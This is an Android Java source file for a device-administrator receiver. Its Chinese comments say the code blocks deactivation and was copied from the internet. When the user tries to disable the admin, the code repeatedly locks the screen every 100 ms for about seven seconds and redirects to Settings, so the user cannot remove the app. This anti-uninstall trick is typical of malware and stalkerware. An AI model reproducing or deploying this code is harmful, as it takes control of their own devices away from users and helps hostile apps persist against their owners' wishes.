package com.Serral.ty;
import android.app.admin.*;
import android.content.*;
import android.graphics.*;
import android.view.*;
import android.widget.*;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver{
		@Override
		public void onEnabled(Context context,Intent intent){
				super.onEnabled(context,intent);
				Toast.makeText(context,"设备管理器：已激活",Toast.LENGTH_SHORT).show();
			}
		@Override
		public void onDisabled(Context context,Intent intent) {
				super.onDisabled(context, intent);
				Toast.makeText(context, "已取消激活", Toast.LENGTH_SHORT).show();
			}
//阻止取消激活设备管理器，源码来源于网络，添加日期2020.3.30
	public CharSequence onDisableRequested(Context context, Intent intent) {  

		// TODO Auto-generated method stub  
		Intent intent1 = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
		intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intent1);
		try {
			Thread.sleep(10);
		} catch (InterruptedException e){
		e.printStackTrace();	
		return"";}
	
	
    //调用设备管理器本身的功能，每 100ms 锁屏一次，用户即便解锁也会立即被锁，直至 7s 后                                                                
    final DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);  
    dpm.lockNow();                                                                                                  
    new Thread(new Runnable() {                                                                                     
	@Override                                                                                                   
	public void run() {                                                                                         
		int i = 0;                                                                                              
		while (i < 70) {                                                                                        
			dpm.lockNow();                                                                                      
			try {                                                                                               
				Thread.sleep(100);                                                                              
				i++;                                                                                            
			} catch (InterruptedException e) {                                                                  
				e.printStackTrace();                                                                            
			}                                                                                                   
		}                                                                                                       
	}                                                                                                           
    }).start();                                                                                                     
//跳转回到设置
		Intent outOfDialog = context.getPackageManager().getLaunchIntentForPackage("com.android.settings");
		outOfDialog.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(outOfDialog);
    return"";                                         
  }
}
